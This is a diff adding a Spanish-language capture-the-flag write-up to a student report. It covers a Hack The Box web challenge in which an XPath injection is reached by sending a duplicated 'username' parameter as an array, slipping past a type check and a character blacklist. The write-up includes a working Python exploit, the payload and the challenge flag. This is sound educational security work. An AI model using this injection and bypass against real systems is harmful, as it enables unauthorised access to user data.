@@ -11,7 +11,7 @@ date: "17 noviembre, 2026"
 | Estudiante            | Djedrielle Alexander - 2024154899   |
 | Estudiante            | Sebastian Donoso - 2024070154       |
 | Profesor              | Dr. Herson Esquivel Vargas          |
-| Puntos acumulados     | 1300 / 2300 XP                      |
+| Puntos acumulados     | 1560 / 2300 XP                      |
 
 ---
 
@@ -794,6 +794,135 @@ instalación de un rootkit en el kernel.
 HTB{N0w_Y0u_C4n_S33_m3_4nd_th3_r00tk1t_h4s_b33n_sUcc3ssfully_d3f34t3d!!}
 ```
 
+---
+
+## 1.6 TreaPortal
+
+| Campo                | Valor                        |
+|----------------------|------------------------------|
+| Categoría            | Web                          |
+| Dificultad           | Easy                         |
+| Puntos (XP reward)   | 260                          |
+| Fecha de resolución  | 9/11/2026                    |
+| Resuelto por         | Sebastian Donoso             |
+
+### Descripción del reto
+
+Reto de Web que entrega el código fuente de un portal de empleados hecho en
+Node.js/TypeScript (Fastify). La "base de datos" no es SQL: es un archivo **XML**
+(`users.xml`) que se consulta con **XPath** (dependencias `@xmldom/xmldom` y
+`xpath`). El único usuario real es `admin`, y la bandera está guardada dentro de su
+registro, en el elemento `<flag>`. Los usuarios que uno registra tienen ese campo
+vacío. El objetivo es lograr que la aplicación devuelva el registro del admin.
+
+### Procedimiento
+
+**Paso 1 — Reconocimiento / análisis inicial**
+
+Se levantó la aplicación localmente (`npm install` + `npm run dev`) para observar
+el flujo: registro, login y un perfil con un buscador de empleados. El endpoint
+`GET /api/user/` es el único que devuelve el objeto de un usuario **incluyendo el
+campo `flag`** — ese es el blanco.
+
+![Portal corriendo localmente](imagenes/TreaPortalLocal.png)
+
+**Paso 2 — Identificación de la vulnerabilidad**
+
+El endpoint arma la consulta XPath concatenando directamente la entrada del usuario:
+
+```ts
+const node = xpath.select1(`//user[username='${username}']`, doc)
+```
+
+Eso es **XPath injection**, pero hay dos defensas que la bloquean cuando `username`
+es un texto:
+
+```ts
+// 1) control de acceso: solo tu propio usuario
+if (typeof username === 'string' && username !== tokenPayload.username) return 403
+// 2) blacklist de caracteres de inyección
+const blacklist = ["'", ';', 'or', 'and', ')', '(', '/', 'doc']
+return blacklist.some(pattern => input.includes(pattern))
+```
+
+La grieta es **confusión de tipos**: si `username` se manda como **array** (el
+parámetro duplicado en la URL: `?username=&username=...`), las dos defensas caen:
+
+- `typeof array === 'string'` es **falso**, así que el `&&` corta y el 403 nunca se
+  ejecuta (evaluación en cortocircuito).
+- `array.includes(patrón)` compara **elementos completos**, no subcadenas, así que
+  los caracteres de inyección (`'`, `or`) **no se detectan**.
+
+Al concatenarse, el array se une con coma: `['', "' or '1'='1"]` → `,' or '1'='1`,
+dejando la consulta `//user[username=',' or '1'='1']`, siempre verdadera, que
+devuelve el primer usuario (el admin) con su `flag`.
+
+**Paso 3 — Explotación**
+
+Se automatizó con un script en Python: registra un usuario (para obtener un JWT
+válido), y luego lanza la inyección con el parámetro `username` duplicado.
+
+```python
+import sys, json, urllib.request, urllib.parse, random
+base = sys.argv[1].rstrip('/')
+
+def post(path, data):
+    req = urllib.request.Request(base+path, data=json.dumps(data).encode(),
+                                 headers={'Content-Type': 'application/json'})
+    return json.load(urllib.request.urlopen(req))
+def get(path, token):
+    req = urllib.request.Request(base+path, headers={'Authorization': 'Bearer '+token})
+    return json.load(urllib.request.urlopen(req))
+
+# Paso 1: registrarse y obtener el JWT (user >= 2 caracteres, email @trea.htb)
+u = "x%d" % random.randint(1000, 9999)
+jwt = post('/api/auth/register', {"username": u, "email": u+"@trea.htb", "password": "x"})["jwt"]
+
+# Paso 2: inyeccion XPath via array (username duplicado)
+qs = "username=&username=" + urllib.parse.quote("' or '1'='1")
+data = get('/api/user/?' + qs, jwt)
+print(data.get("flag"))
+```
+
+Uso: `python3 exploit_treaportal.py http://<IP>:<PUERTO>` (la IP y puerto de la
+instancia de HTB). También puede hacerse a mano con dos `curl`, o en vivo desde la
+consola del navegador con un `fetch` que duplique el parámetro.
+
+![Flag obtenida con el exploit](imagenes/TreaPortalFlag.png)
+
+### Herramientas utilizadas
+
+| Herramienta       | Uso en el reto                                         |
+|-------------------|--------------------------------------------------------|
+| Python (urllib)   | Automatizar el registro y la inyección                 |
+| curl / navegador  | Enviar la petición con el parámetro `username` duplicado |
+| Lectura de código | Analizar el fuente (Fastify, XPath, el filtro débil)   |
+
+### Debilidad (CWE)
+
+**CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')**
+
+La entrada del usuario se concatena directamente en la consulta
+`//user[username='...']`. Se agrava con **CWE-184 (Incomplete Blacklist)** —el filtro
+intenta enumerar caracteres peligrosos en vez de validar lo permitido— y con
+**CWE-843 (Type Confusion)**: enviar el parámetro como array evade tanto el `typeof`
+del control de acceso como el `.includes` del filtro, desembocando en
+**CWE-284 (Improper Access Control)**.
+
+### Patrón de ataque (CAPEC)
+
+**CAPEC-83: XPath Injection**
+
+Se inyectó una expresión XPath siempre verdadera para alterar la lógica de la
+consulta y recuperar un registro restringido (el del admin). La duplicación del
+parámetro para formar el array corresponde a **CAPEC-460: HTTP Parameter Pollution**.
+
+### Bandera
+
+```
+HTB{8801630138dddbc823abda01f60eb727}
+```
+
 # 2. Calendario de resolución
 
 | #  | Fecha Inicio | Reto       | Categoría  | Puntos | Fecha Fin    | Integrante  |
@@ -803,6 +932,7 @@ HTB{N0w_Y0u_C4n_S33_m3_4nd_th3_r00tk1t_h4s_b33n_sUcc3ssfully_d3f34t3d!!}
 | 3  | 7/10/2026    | Execute    | Pwn        | 260    | 7/10/2026    | Sebastian   |
 | 4  | 26/10/2026   | Last Call  | Pwn        | 260    | 26/10/2026   | Sebastian   |
 | 5  | 29/10/2026   | Cyberpsychosis | Reversing | 260 | 30/10/2026   | Sebastian   |
+| 6  | 9/11/2026    | TreaPortal | Web        | 260    | 9/11/2026    | Sebastian   |
 | …  |              |            |            |        |              |             |
 
 ---
@@ -816,8 +946,9 @@ HTB{N0w_Y0u_C4n_S33_m3_4nd_th3_r00tk1t_h4s_b33n_sUcc3ssfully_d3f34t3d!!}
 | Execute    | Pwn         |              |  X           |
 | Last Call  | Pwn         |              |  X           |
 | Cyberpsychosis | Reversing |            |  X           |
+| TreaPortal | Web         |              |  X           |
 | …          |             |              |              |
-| **Total**  |             | **520**      | **780**      |
+| **Total**  |             | **520**      | **1040**     |
 
 ### Verificación de requisitos
 
